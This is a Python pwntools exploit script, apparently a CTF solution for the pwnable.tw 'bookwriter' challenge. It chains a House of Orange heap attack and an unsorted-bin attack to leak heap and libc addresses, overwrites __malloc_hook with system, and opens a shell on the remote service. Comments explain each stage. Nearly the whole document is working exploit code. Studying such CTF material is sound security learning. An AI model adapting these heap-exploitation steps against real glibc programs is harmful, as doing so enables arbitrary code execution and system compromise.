from pwn import *

local = False

if local:
	r = process("./bookwriter")
	sys_off = 0x45390
	binsh_off = 0x18cd57
	malloc_hook_off = 0x3c4b10
else:
	r = remote("chall.pwnable.tw", 10304)
	sys_off = 0x45390	
	binsh_off = 0x18c177
	malloc_hook_off = 0x3c3b10

def add(size, content):
	r.sendline("1")
	r.recvuntil("Size of page :")
	r.sendline(str(size))
	r.recvuntil("Content :")
	r.send(content)
	r.recvuntil("Your choice :")

def view(index):
	r.sendline("2")
	r.recvuntil("Index of page :")
	r.sendline(str(index))
	return r.recvuntil("Your choice :")

def edit(index, content):
	r.sendline("3")
	r.recvuntil("Index of page :")
	r.sendline(str(index))
	r.recvuntil("Content:")
	r.send(content)
	r.recvuntil("Your choice :")

def info(question, author):
	r.send("4")
	result = r.recvuntil("(yes:1 / no:0)")
	if question[0] == '0':
		r.sendline("0")
		r.recvuntil("Your choice :")
	else:
		r.sendline(question)
		r.recvuntil("Author :")
		r.send(author)	
		r.recvuntil("Your choice :")
	return result	

def quit():
	r.sendline("5")


r.recvuntil("Author :")
author = "a"*0x30 + p64(0) + p64(0x51)
r.send(author)
r.recvuntil("Your choice :")

# make 8 note
add(0x30, "lux")      # note_list[0]
add(0x10, "sona")     # note_list[1]
add(0x10, "sona")     # note_list[2]
add(0x10, "sona")     # note_list[3]
add(0x10, "sona")     # note_list[4]
add(0x10, "sona")     # note_list[5]
add(0x10, "sona")     # note_list[6]
add(0x10, "sona")     # note_list[7]

# make size of note_list[0] = 0
edit(0, "\n")

# make the note_list[8]
# now, size of the note_list[0] is 0xyyzztt, large enough to overwrite size of top chunk by editting note_list[0]
add(0x10, "javan")

# This is the time for House_of_orange attack
# first, make top chunk size smaller

# By editting note_list[0], we overwrite top chunk size
payload = p64(0)*7 + (p64(0x21) + p64(0)*3)*8 + p64(0xec1)
edit(0, payload)

# make size of note_list[0] = 0
# so now add a malloc in note_list[8]
edit(0, "\n")

# To make House_of_orange attack, the next step is call malloc(x) with  0xec1 < x < max_system_mem = 0x21000
add(0x1000, "/bin/sh\x00")

#Now top chunk has been freed and go into unsorted bin
# Size of note_list[0] have a big number again ( = heap + 0x21000 + 0x10)

# This is the time for unsorted_bin_attack
# we will make the note_list[0] change from heap'addr+0x10 to main_arena+88
# by overwrite top_chunk.bk
note_list = 0x6020a0
payload = p64(0)*7 + (p64(0x21) + p64(0)*3)*8 + p64(0x31) + p64(0) + p64(note_list-0x10)
edit(0, payload)

# make note_list[8] = 0 again for another malloc
edit(0, "\n")

# Now, when malloc happen, note_list[0] = main_arena+88
# in struct main_arena: bin[0] = top_chunk_addr
#                       bin[1] = note_list - 0x10
add(0x20, "\n")


# leak heap base addr
# now note_list[0] = main_arena+88 -> main_arena.top
# so we can leak heap top address
result = view(0)
result = result.split("Content :\n")[1][:4]
if result[3] == "\n":
	result = u64(result[:3] + "\x00"*5)
else:
	result = u64(result + "\x00"*4)	
# 0x22010 = 0x21000 + 0x1000 + 0x10
heap_base = result - 0x22010

# overwrite main_arena.(top, last_remainder, bins[0], bin[1]) to get bins[2] (main_arena+104)
payload = "a"*0x1c + "cccc"
edit(0, payload)

# leak main_arena+104
result = view(0)
result = result.split("cccc")[1][:6] + "\x00\x00"
result = u64(result)
libc_base = result - 104 - 0x10 - malloc_hook_off

# Now we overwrite (main_arena+88).bk = note_list-0x10
#                  (main_arena+88).bk is main_arena.bins[1]
# and make size[0] = 0 to the next malloc
payload = p64(heap_base) + p64(0) + p64(libc_base+malloc_hook_off+0x10+88) + p64(note_list-0x10)
edit(0, payload)

# when malloc happen, it checks size in note_list-0x8 (I already set in author at the beginning)
# and check the folowing line:
#       victim = unsorted_chunks(av)->bk
#       bck = victim->bk;
#       unsorted_chunks(av)->bk = bck;
#       bck->fd = unsorted_chunks(av);
#   victim = note_list-0x10
#   bck = note_list[1]
#   unsorted_chunks(av)-> note_list[1]
#   note_list[1].fd = unsorted_chunks(av)
# Or we can say: we need to:
# 1: set bins[1] = chunk
# 2: set chunk.size
# 3: set chunk.bk = addr (as long as in write memory area)
# after this malloc: only 2things happen: bins[1] = chunk.bk, chunk.bk.fd = main_arena+88

### now malloc_hook add will be in note_list[1], note_list[0] hold the first chunk on heap
payload = p64(heap_base+0x10) + p64(libc_base+malloc_hook_off)
add(0x40, payload)

# overwrite malloc_hook
edit(1, p64(libc_base+sys_off))

# clear size[0] to make malloc
edit(0, "\n")

# in fact malloc_hook now is system
r.sendline("1")
r.recvuntil("Size of page :")
# malloc(size)
# size 4 byte so we can not use addr of /bin/sh in libc (take 6bytes)
# so i take addr in heap (3 bytes) 
r.sendline(str(heap_base+0x21000+0x10))

r.interactive()


'''
***** Note:
- House of orange attack to make top_chunk into unsorted bin
- Use unsorted bin attack to overwrite that top_chunk.bk to make note_list[0] = main_arena+88
- now we can leak heap_base, libc_base thanks to note_list[0]
- now overwrite bins[1] to malloc return addr of note_list[0] and we change note_list[1] = malloc_hook
- edit note_list[1] to system
- the next call malloc will call system
- Understand malloc a chunk in unsorted bin (important)
'''

"""
I have 2 solution:
- The first one, it longs, of cource, but I discover a lot of interested thing, but it fail when run at remote,
despite it success in my local and I don't know why. I just want to debug it in the remote machine. 
And it in file bookwriter_s2.py, you just to edit from line 6 to line 10.
- This solution is shorter and faster than other wild solution, and that make me proud of me, haha
- But the other wild sulotion mention to a horrible file technique skill
- Reference of that technique in here: https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique
and here: https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
"""
